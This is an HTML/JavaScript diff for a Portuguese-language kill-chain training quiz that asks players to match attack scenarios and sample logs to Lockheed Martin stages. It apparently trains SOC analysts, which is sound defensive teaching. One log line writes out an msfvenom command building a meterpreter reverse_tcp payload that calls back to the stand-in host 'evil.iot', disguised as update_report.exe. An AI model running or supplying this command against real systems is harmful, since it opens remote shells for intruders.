@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CYBER KILL CHAIN // SIMULATOR</title>
+    <style>
+        :root {
+            --bg-color: #0d0d0d;
+            --panel-bg: #141414;
+            --primary: #ff6600;
+            --primary-glow: rgba(255, 102, 0, 0.3);
+            --text-color: #e0e0e0;
+            --text-muted: #888;
+            --success: #00ff66;
+            --error: #ff0033;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 2px solid var(--primary);
+            padding-bottom: 10px;
+            width: 100%;
+            max-width: 900px;
+            box-shadow: 0 4px 10px var(--primary-glow);
+        }
+
+        header h1 {
+            color: var(--primary);
+            font-size: 2rem;
+            letter-spacing: 3px;
+            text-shadow: 0 0 10px var(--primary);
+        }
+
+        header p {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            margin-top: 5px;
+        }
+
+        .container {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal-panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--primary);
+            padding: 20px;
+            border-radius: 4px;
+            position: relative;
+            box-shadow: inset 0 0 15px rgba(255, 102, 0, 0.05);
+        }
+
+        .terminal-panel::before {
+            content: "SYSTEM_STATUS: ACTIVE";
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: var(--bg-color);
+            padding: 0 5px;
+            font-size: 0.75rem;
+            color: var(--primary);
+        }
+
+        .scenario-box {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            margin-bottom: 15px;
+            min-height: 80px;
+        }
+
+        .log-output {
+            background: #050505;
+            border-left: 3px solid var(--primary);
+            padding: 10px;
+            font-size: 0.85rem;
+            color: #ffaa66;
+            overflow-x: auto;
+            white-space: pre-wrap;
+            margin-bottom: 20px;
+        }
+
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 12px;
+        }
+
+        .btn-option {
+            background: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary);
+            padding: 12px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.2s ease;
+            text-align: left;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+        }
+
+        .btn-option:hover {
+            background: var(--primary);
+            color: #000;
+            box-shadow: 0 0 15px var(--primary);
+        }
+
+        .score-board {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 0.9rem;
+            border-top: 1px dashed #333;
+            padding-top: 15px;
+            margin-top: 15px;
+        }
+
+        .feedback {
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .feedback.correct { color: var(--success); text-shadow: 0 0 8px var(--success); }
+        .feedback.incorrect { color: var(--error); text-shadow: 0 0 8px var(--error); }
+
+        .game-over {
+            text-align: center;
+            padding: 40px 20px;
+        }
+
+        .game-over h2 {
+            color: var(--primary);
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px var(--primary);
+        }
+
+        .btn-restart {
+            background: var(--primary);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-top: 20px;
+        }
+        
+        .btn-restart:hover {
+            box-shadow: 0 0 20px var(--primary);
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>METASPLOIT_ORACLE // KILL_CHAIN_CORRELATION</h1>
+        <p>Analise as evidências térmicas e correlacione o evento com o estágio correto da infraestrutura de ataque.</p>
+    </header>
+
+    <div class="container" id="game-container">
+        <div class="terminal-panel">
+            <div class="scenario-box" id="scenario-text">
+                Carregando vetores de ataque...
+            </div>
+            <div class="log-output" id="log-text">
+                [LOG CODES]
+            </div>
+            
+            <div class="options-grid" id="options-container">
+                </div>
+
+            <div class="score-board">
+                <div>PROGRESSO: <span id="current-question">0</span>/<span id="total-questions">0</span></div>
+                <div class="feedback" id="feedback-text"></div>
+                <div>SCORE: <span id="score-val" style="color: var(--primary);">0</span></div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Banco de dados dos desafios (Cenários Reais e Técnicos)
+        const database = [
+            {
+                scenario: "O atacante utiliza ferramentas como Nmap e Shodan para mapear portas abertas e identificar serviços vulneráveis voltados para a Internet no servidor web da empresa.",
+                log: "$ nmap -sV -Pn -T4 target-app.com\n[+] Discovering open ports...\nPort 80/tcp open (Apache httpd 2.4.41)\nPort 443/tcp open (OpenSSL 1.1.1d)",
+                stage: "Reconnaissance"
+            },
+            {
+                scenario: "O agente de ameaça constrói um payload customizado do Metasploit (reverse_tcp) e o anexa a um e-mail de phishing mascarado como uma atualização urgente de política interna.",
+                log: "$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=evil.iot LPORT=4444 -f exe > update_report.exe\n[+] Payload size: 712681 bytes\n[+] Saved as: update_report.exe",
+                stage: "Weaponization"
+            },
+            {
+                scenario: "O e-mail de spear-phishing contendo o link malicioso ou o anexo infectado é enviado com sucesso e ultrapassa o gateway de e-mail, chegando à caixa de entrada do Diretor Financeiro.",
+                log: "SMTP Gateway Log:\nFROM: hr-update@trusted-domain.com (Spoofed)\nTO: cfo@target-corp.com\nSUBJECT: Emergency Update Alert\nATTACHMENT: update_report.exe [Status: DELIVERED]",
+                stage: "Delivery"
+            },
+            {
+                scenario: "O usuário clica no arquivo executável malicioso recebido. O código aproveita uma vulnerabilidade de estouro de buffer (Buffer Overflow) não corrigida na aplicação local para assumir o controle do processo.",
+                log: "OS Kernel Event ID 1000: Application Error\nFaulting application name: update_report.exe\nException code: 0xc0000005 (Access Violation at memory location 0x7fff40)",
+                stage: "Exploitation"
+            },
+            {
+                scenario: "O malware descompacta seus binários nas pastas ocultas do sistema AppData/Local e modifica chaves de registro do Windows (RunKeys) para garantir execução persistente após o reboot.",
+                log: "Registry Monitor Alert:\nProcess: update_report.exe\nAction: RegSetValue\nPath: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Backdoor_Svc",
+                stage: "Installation"
+            },
+            {
+                scenario: "O malware instalado abre um canal de comunicação criptografado de saída (Beaconing) via HTTPS apontando para o IP do servidor externo controlado pelos atacantes, aguardando instruções remotas.",
+                log: "Firewall Outbound Connection:\nSRC: 192.168.1.45 (Internal Host) -> DST: 185.220.101.5 [Port 443]\nTraffic: Periodic beaconing detected every 30 seconds. Signature: CobaltStrike.C2",
+                stage: "Command & Control"
+            },
+            {
+                scenario: "Com privilégios elevados de administrador, o atacante varre a rede local, localiza o servidor principal de banco de dados e inicia a exfiltração de dados confidenciais de clientes.",
+                log: "SIEM Threat Intelligence Alert:\nAccount: SYSTEM (Compromised)\nAction: Bulk data export completed.\nTarget: DB_PROD_CUSTOMERS.sql -> compressed to backup.7z -> Exfiltrated.",
+                stage: "Actions on Objectives"
+            }
+        ];
+
+        // Lista de todas as fases da Lockheed Martin para renderizar botões
+        const killChainStages = [
+            "Reconnaissance",
+            "Weaponization",
+            "Delivery",
+            "Exploitation",
+            "Installation",
+            "Command & Control",
+            "Actions on Objectives"
+        ];
+
+        let currentIdx = 0;
+        let score = 0;
+        let shuffledQuestions = [];
+
+        // Inicializa o simulador e embaralha as perguntas para não ficarem na ordem óbvia
+        function initGame() {
+            shuffledQuestions = [...database].sort(() => Math.random() - 0.5);
+            currentIdx = 0;
+            score = 0;
+            document.getElementById('total-questions').innerText = shuffledQuestions.length;
+            document.getElementById('score-val').innerText = score;
+            loadQuestion();
+        }
+
+        function loadQuestion() {
+            if (currentIdx >= shuffledQuestions.length) {
+                showGameOver();
+                return;
+            }
+
+            document.getElementById('current-question').innerText = currentIdx + 1;
+            document.getElementById('feedback-text').innerText = "";
+            
+            const currentQ = shuffledQuestions[currentIdx];
+            document.getElementById('scenario-text').innerText = `[ALERTA_CENÁRIO] ${currentQ.scenario}`;
+            document.getElementById('log-text').innerText = currentQ.log;
+
+            // Renderiza os botões de opções
+            const optionsContainer = document.getElementById('options-container');
+            optionsContainer.innerHTML = "";
+
+            killChainStages.forEach(stage => {
+                const btn = document.createElement('button');
+                btn.className = 'btn-option';
+                btn.innerText = stage;
+                btn.onclick = () => checkAnswer(stage);
+                optionsContainer.appendChild(btn);
+            });
+        }
+
+        function checkAnswer(selectedStage) {
+            const correctAnswer = shuffledQuestions[currentIdx].stage;
+            const feedbackEl = document.getElementById('feedback-text');
+
+            // Desabilita botões temporariamente para evitar double click
+            const buttons = document.querySelectorAll('.btn-option');
+            buttons.forEach(b => b.disabled = true);
+
+            if (selectedStage === correctAnswer) {
+                feedbackEl.className = "feedback correct";
+                feedbackEl.innerText = "// ACESSO CONCEDIDO: CORRELAÇÃO CORRETA";
+                score += 100;
+                document.getElementById('score-val').innerText = score;
+            } else {
+                feedbackEl.className = "feedback incorrect";
+                feedbackEl.innerText = `// FALHA: ERA EXPECTADO [${correctAnswer.toUpperCase()}]`;
+            }
+
+            // Próxima pergunta após 2.5 segundos para dar tempo de ler o feedback
+            setTimeout(() => {
+                currentIdx++;
+                loadQuestion();
+            }, 2500);
+        }
+
+        function showGameOver() {
+            const container = document.getElementById('game-container');
+            const maxScore = shuffledQuestions.length * 100;
+            const performance = (score / maxScore) * 100;
+            
+            let evaluation = "";
+            if (performance === 100) evaluation = "STATUS: EXPERT IN DFIR & THREAT INTEL";
+            else if (performance >= 70) evaluation = "STATUS: OPERADOR DE SOC QUALIFICADO";
+            else evaluation = "STATUS: NEÓFITO DETECTADO. REINICIE O TREINAMENTO.";
+
+            container.innerHTML = `
+                <div class="terminal-panel game-over">
+                    <h2>DEBRIEFING DO EXERCÍCIO COMPLETO</h2>
+                    <p style="font-size: 1.2rem; margin-bottom: 10px;">Pontuação Final: <span style="color: var(--primary); font-weight:bold;">${score}</span> / ${maxScore} pts</p>
+                    <p style="color: #ffaa66; font-weight: bold; margin-bottom: 30px;">${evaluation}</p>
+                    <button class="btn-restart" onclick="window.location.reload()">Reiniciar Simulação</button>
+                </div>
+            `;
+        }
+
+        // Executa ao carregar a página
+        window.onload = initGame;
+    </script>
+</body>
+</html>
